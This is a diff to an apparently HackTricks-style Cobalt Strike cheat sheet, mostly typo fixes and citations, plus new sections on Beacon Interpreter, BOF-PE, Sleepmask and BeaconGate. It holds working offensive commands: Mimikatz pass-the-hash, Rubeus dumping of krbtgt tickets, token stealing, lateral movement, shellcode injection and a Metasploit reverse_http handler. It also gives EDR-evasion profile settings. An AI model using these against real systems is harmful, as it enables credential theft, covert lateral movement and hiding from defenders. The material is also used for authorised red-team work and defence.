@@ -64,7 +64,7 @@ portscan [targets] [ports] [arp|icmp|none] [max connections]
 ## Import Powershell module
 powershell-import C:\path\to\PowerView.ps1
 powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
-powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
+powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
 powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
 powerpick Invoke-PrivescAudit | fl
 psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.
@@ -104,7 +104,7 @@ pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash through mimikatz
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
-## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
+## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
 steal_token <pid> #Steal token from process created by mimikatz
 
 ## Pass the ticket
@@ -113,7 +113,7 @@ execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
 make_token <domain>\<username> DummyPass
-## Write the ticket in the attacker machine from a poweshell session & load it
+## Write the ticket on the attacker machine from a PowerShell session and load it
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
@@ -126,7 +126,7 @@ steal_token <pid>
 ## Extract ticket + Pass the ticket
 ### List tickets
 execute-assembly C:\path\Rubeus.exe triage
-### Dump insteresting ticket by luid
+### Dump an interesting ticket by LUID
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
 ### Create new logon session, note luid and processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
@@ -144,7 +144,7 @@ jump [method] [target] [listener]
 ## psexec_psh                x86   Use a service to run a PowerShell one-liner
 ## winrm                     x86   Run a PowerShell script via WinRM
 ## winrm64                   x64   Run a PowerShell script via WinRM
-## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)
+## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)
 
 
 remote-exec [method] [target] [command] # remote-exec doesn't return output
@@ -159,7 +159,7 @@ beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
 
 # Pass session to Metasploit - Through listener
-## On metaploit host
+## On the Metasploit host
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
 msf6 exploit(multi/handler) > set LHOST eth0
@@ -180,7 +180,7 @@ ps
 shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process
 
 # Pass metasploit session to cobalt strike
-## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
+## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
 ## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode
 
 
@@ -196,10 +196,10 @@ beacon> ssh 10.10.17.12:22 username password
 
 ### Custom implants / Linux Beacons
 
-- A custom agent only needs to speak the Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) to register/check-in and receive tasks. Implement the same URIs/headers/metadata crypto defined in the profile to reuse the Cobalt Strike UI for tasking and output.
+- A custom agent only needs to speak the Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) to register/check-in and receive tasks. Implement the same URIs/headers/metadata crypto defined in the profile to reuse the Cobalt Strike UI for tasking and output.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
 - An Aggressor Script (e.g., `CustomBeacon.cna`) can wrap payload generation for the non-Windows beacon so operators can select the listener and produce ELF payloads directly from the GUI.
 - Example Linux task handlers exposed to the Team Server: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, and `exit`. These map to task IDs expected by the Team Server and must be implemented server-side to return output in the proper format.
-- BOF support on Linux can be added by loading Beacon Object Files in-process with [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (supports Outflank-style BOFs too), allowing modular post-exploitation to run inside the implant's context/privileges without spawning new processes.
+- BOF support on Linux can be added by loading Beacon Object Files in-process with [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (supports Outflank-style BOFs too), allowing modular post-exploitation to run inside the implant's context/privileges without spawning new processes.<sup>[[2]](#references)[[3]](#references)</sup>
 - Embed a SOCKS handler in the custom beacon to keep pivoting parity with Windows Beacons: when the operator runs `socks <port>` the implant should open a local proxy to route operator tooling through the compromised Linux host into internal networks.
 
 ## Opsec
@@ -213,6 +213,23 @@ The **`execute-assembly`** uses a **sacrificial process** using remote process i
 - In Cobalt Strike you can also use BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
 
 The agressor script `https://github.com/outflanknl/HelpColor` will create the `helpx` command in Cobalt Strike which will put colors in commands indicating if they are BOFs (green), if they are Frok&Run (yellow) and similar, or if they are ProcessExecution, injection or similar (red). Which helps to know which commands are more stealthy.
+
+### Modern in-process post-execution
+
+Recent versions add two alternatives when a classic COFF BOF is too constrained:
+
+- **Beacon Interpreter** compiles C on the Team Server to intermediate bytecode and executes it in a VM embedded in Beacon. The bytecode remains data rather than native executable code, so this avoids the extra executable allocation and RW-to-RX permission transition normally required to load a BOF. Scripts can import the Beacon API and declare BOF-style Dynamic Function Resolution (DFR) prototypes.
+- **BOF-PE** loads a complete EXE or DLL in the current Beacon. This format supports normal PE imports, exception handling, richer C++ and external libraries while retaining the Beacon API. This is heavier than a small COFF BOF, so choose it only when the additional runtime is useful.
+
+```bash
+# Compile a C script on the Team Server and execute its bytecode
+beacon-interpreter /path/to/script.c
+
+# Execute a BOF-PE in the current Beacon
+inline-execute-pe /path/to/tool.x64.exe
+```
+
+These mechanisms reduce loader-related signals, not the telemetry produced by the script's actions or Windows API calls.<sup>[[8]](#references)</sup>
 
 ### Act as the user
 
@@ -235,15 +252,15 @@ Stageless payloads are less noisy than staged ones because they don't need to do
 
 ### Tokens & Token Store
 
-Be careful when you steal or generate tokens because it might be posisble for an EDR to enumerate all the tokens of all the threads and find a **token belonging to a different user** or even SYSTEM in the process.
+Be careful when stealing or generating tokens because an EDR may enumerate thread tokens and detect a **token belonging to a different user** or even SYSTEM inside the process.
 
 This allows to store tokens **per beacon** so it's not needed to steal the same token again and again. This is useful for lateral movement or when you need to use a stolen token multiple times:
 
-- token-store steal <pid>
-- token-store steal-and-use <pid>
+- `token-store steal <pid>`
+- `token-store steal-and-use <pid>`
 - token-store show
-- token-store use <id>
-- token-store remove <id>
+- `token-store use <id>`
+- `token-store remove <id>`
 - token-store remove-all
 
 When moving laterally, usually is better to **steal a token than to generate a new one** or perform a pass the hash attack.
@@ -276,9 +293,26 @@ In Cobalt Strike profiles you can also modify things like:
 - The memory footprint and DLL content with `stage {...}` block
 - The network traffic
 
-### Bypass memory scanning
+### Sleepmask and BeaconGate
 
-Some ERDs scan memory for some know malware signatures. Coblat Strike allows to modify the `sleep_mask` function as a BOF that will be able to encrypt in memory the bacldoor.
+A Sleepmask transforms Beacon and its tracked heap allocations while it is dormant, then restores them for task execution. Current releases provide an evasive default, but custom Sleepmask BOFs remain useful when memory layout, allocation or call-stack requirements differ. As of 4.13, the default Sleepmask also spoofs the return address for APIs proxied through BeaconGate.<sup>[[8]](#references)</sup>
+
+**BeaconGate** extends this design beyond `Sleep`: selected WinAPI calls are represented as `FUNCTION_CALL` structures and forwarded to the Sleepmask BOF, which can mask Beacon while executing the call. The profile can gate a group (`Comms`, `Core`, `Cleanup` or `All`) or only individual APIs:<sup>[[9]](#references)</sup>
+
+```text
+stage {
+    set sleep_mask "true";
+    set syscall_method "Indirect";
+
+    beacon_gate {
+        VirtualAlloc;       # Routed through BeaconGate
+        VirtualAllocEx;
+        InternetConnectA;
+    }
+}
+```
+
+For an API listed under `beacon_gate`, the gate takes precedence over `syscall_method`; APIs not listed can still use the configured syscall method. `beacon_gate disable` and `beacon_gate enable` toggle the feature at runtime. Avoid enabling `All` blindly: commands such as `ps` repeatedly call `OpenProcess`/`CloseHandle` and can produce a CPU spike when every call masks and unmasks Beacon. Sleepmask-VS provides mocked Beacon/Sleepmask state for debugging custom gates without repeatedly testing them through a live implant.<sup>[[9]](#references)</sup>
 
 ### Noisy proc injections
 
@@ -389,14 +423,17 @@ pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 
 </details>
 
+
+
 ## References
 
-- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
-- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
-- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
-- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
-- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
-- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
-- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
-
+- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
+- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
+- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
+- [4] [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
+- [5] [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
+- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
+- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
+- [8] [Cobalt Strike 4.13: Lost In Translation](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
+- [9] [Cobalt Strike 4.10: Through the BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
 {{#include ../banners/hacktricks-training.md}}
